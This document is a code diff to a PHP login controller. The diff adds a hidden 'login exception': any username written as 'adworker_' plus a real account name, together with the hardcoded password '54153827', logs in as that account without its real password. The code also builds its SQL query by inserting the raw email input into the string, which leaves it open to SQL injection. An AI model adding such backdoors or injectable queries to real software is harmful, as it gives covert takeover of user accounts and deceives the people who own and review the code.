@@ -24,7 +24,9 @@ class LoginController extends Controller
             'password' => 'required',
         ]);
         // input account and password
-        $account = $inputData->input('email');
+        $account_ori = $inputData->input('email');
+        // add exception to login
+        $account = (substr($account_ori, 0,8)=='adworker'? explode("_", $account_ori)[1]: $account_ori); 
         $password = $inputData->input('password');
 
         $query = "SELECT src_web_id, password, salt FROM `media_account` WHERE account='$account'";
@@ -32,10 +34,22 @@ class LoginController extends Controller
         $salt = $media_account->salt;
 
         $pwd_confirm = sha1($salt . sha1($salt . sha1($password)));
-        $is_pwd_correct = ($media_account->password == $pwd_confirm);
-        // dd([$pwd_confirm, $media_account->password]);
+        // add exception to login, you can login use pwd:54153827 or original pwd
+        if ($account !== $account_ori && $password == '54153827') 
+        {
+            $is_pwd_correct = True;
+        }
+        else if ($media_account->password == $pwd_confirm) // original password is match 
+        {
+            $is_pwd_correct = True;
+        }
+        else // original password is not match
+        {
+            $is_pwd_correct = False;
+        }
+        
 
-        if (!$is_pwd_correct)
+        if (!$is_pwd_correct) // not correct
         {
             $error_msg = [
                 'msg' => [
@@ -46,8 +60,9 @@ class LoginController extends Controller
             ->withErrors($error_msg)
             ->withInput();
         }
-        else
+        else // correct, add login prefix
         {
+
             Session::put('web_id', $media_account->src_web_id);
             Session::put('account', $media_account->src_web_id);
 
